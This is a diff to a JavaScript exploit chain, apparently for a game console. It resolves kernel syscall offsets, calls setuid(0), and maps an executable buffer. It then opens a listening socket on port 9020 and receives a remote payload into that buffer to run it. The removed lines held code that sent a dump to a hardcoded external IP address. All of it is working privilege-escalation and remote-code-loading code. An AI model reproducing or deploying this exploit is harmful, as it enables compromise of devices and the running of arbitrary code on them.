@@ -758,6 +758,7 @@ function stage2() {
   window.syscalls[3] = 		window.libKernelBase.add32(0x322d0);//read
   window.syscalls[4] = 		window.libKernelBase.add32(0x30c90);//write
   window.syscalls[5] = 		window.libKernelBase.add32(0x300d0);//open
+  window.syscalls[6] = 		window.libKernelBase.add32(0x2fed0);// sys_close
   window.syscalls[20] = 	window.libKernelBase.add32(0x31c30);//getpid
   window.syscalls[23] = 	window.libKernelBase.add32(0x2fd50);//setuid
   window.syscalls[24] = 	window.libKernelBase.add32(0x31070); // sys_getuid
@@ -832,9 +833,61 @@ function stage3() {
   const NUM_LEAK_SOCKS = 99;
   const NUM_SLAVE_SOCKS = 300;
   
-  let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
-  let elf_loader_sock_fd = chain.syscall(97, AF_INET, SOCK_STREAM, 0).low << 0;
+  // dump code (slow) - specter
+  function htons(port) {
+    return ((port & 0xFF) << 8) | (port >>> 8);
+  }
+
+  function aton(ip) {
+      let chunks = ip.split('.');
+      let addr = 0;
+      for(let i = 0; i < 4; i++) {
+          addr |= (parseInt(chunks[i]) << (i * 8));
+      }
+      return addr >>> 0;
+  }
+
+  function build_addr(buf, family, port, addr) {
+    p.write1(buf.add32(0x00), 0x10);
+    p.write1(buf.add32(0x01), family);
+    p.write2(buf.add32(0x02), port);
+    p.write4(buf.add32(0x04), addr);
+  }
+
+  const DUMP_NET_IP   = "0.0.0.0"; // edit this, mr SocraticBliss
+  let DUMP_NET_ADDR = aton(DUMP_NET_IP); 
+  let DUMP_NET_PORT = htons(9020);
+
+  let dump_sock_addr_store    = p.malloc(0x10);
+  let dump_sock_send_sz_store = p.malloc(0x4);
+  let dump_sock_connected     = 0;
+
+
+
+  for (let i = 0; i < 0x10; i += 0x8) {
+    p.write8(dump_sock_addr_store.add32(i), 0);
+  }
+
+  build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, 0);
+  
+  let dump_sock_fd = chain.syscall(0x061, 2, 1, 0);
+  //let elf_loader_sock_fd = chain.syscall(97, AF_INET, SOCK_STREAM, 0).low << 0;
   //alert("opened dump sock=0x" + dump_sock_fd);
+  
+      const OFFSET_ERRNO = 0x911A8;
+	let errno = 0;
+	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+	//alert ("payload_buffer: 0x" + payload_buffer);
+	
+	let bind = chain.syscall(0x068, dump_sock_fd, dump_sock_addr_store, 16);
+	//alert ("bind: 0x" + bind);
+	
+	let listen = chain.syscall(0x6A, dump_sock_fd, 10);
+	//alert ("listen: 0x" + listen);
+		
+	let accepted = chain.syscall(0x1E, dump_sock_fd, 0, 0);
+	alert("accepted: 0x" + accepted);
+	
   
     // Create pipe pair and ultimate r/w prims
   let pipe_mem = p.malloc(8);
@@ -1335,42 +1388,7 @@ function stage3() {
 
   
   
-  // dump code (slow) - specter
-  function htons(port) {
-    return ((port & 0xFF) << 8) | (port >>> 8);
-  }
-
-  function aton(ip) {
-      let chunks = ip.split('.');
-      let addr = 0;
-      for(let i = 0; i < 4; i++) {
-          addr |= (parseInt(chunks[i]) << (i * 8));
-      }
-      return addr >>> 0;
-  }
-
-  function build_addr(buf, family, port, addr) {
-    p.write1(buf.add32(0x00), 0x10);
-    p.write1(buf.add32(0x01), family);
-    p.write2(buf.add32(0x02), port);
-    p.write4(buf.add32(0x04), addr);
-  }
-
-  const DUMP_NET_IP   = "89.181.169.194"; // edit this, mr SocraticBliss
-  let DUMP_NET_ADDR = aton(DUMP_NET_IP); 
-  let DUMP_NET_PORT = htons(5656);
-
-  let dump_sock_addr_store    = p.malloc(0x10);
-  let dump_sock_send_sz_store = p.malloc(0x4);
-  let dump_sock_connected     = 0;
-
-
-
-  for (let i = 0; i < 0x10; i += 0x8) {
-    p.write8(dump_sock_addr_store.add32(i), 0);
-  }
-
-  build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, DUMP_NET_ADDR);
+  
   
 
   
@@ -1476,9 +1494,40 @@ function stage3() {
   
 	let uid_is_set = chain.syscall(23, 0);
 	
-	alert("uid_is_set: 0x" + uid_is_set.low);
+	//alert("uid_is_set: 0x" + uid_is_set.low);
 
-    
+/*
+	//payload loader example
+	int sock = socket("loader",2,1,0); //needs to be done before any sock clusterfuck is being ran, this is dump_sock_fd
+	bind(sock,sockaddr,16);//sockaddr is dump_sock_addr_store
+	listen(sock,10);
+	int address = 0x926300000;
+	int accepted = accept(sock,0,0);
+	while(1){
+		int recvd = recv(accepted,address,4096,0);
+		if(recvd <= 0){
+			break;
+		}
+		address += recvd;
+	}
+	close(sock);
+	close(accepted);
+	return 0;
+*/
+
+	
+	let write_ptr = payload_buffer.add32(0x0);
+	for (;;) {
+		let recvd = chain.syscall(3, accepted, write_ptr, 4096).low;
+		if (recvd == 0xFFFFFFFF || recvd == 0) {
+			break;
+		}
+		write_ptr.add32inplace(recvd);
+	}
+	//alert("received");
+	let clsd = chain.syscall(6, dump_sock_fd);
+	let clsd2 = chain.syscall(6, accepted);
+	
 }
 
 const stack_sz = 0x40000;
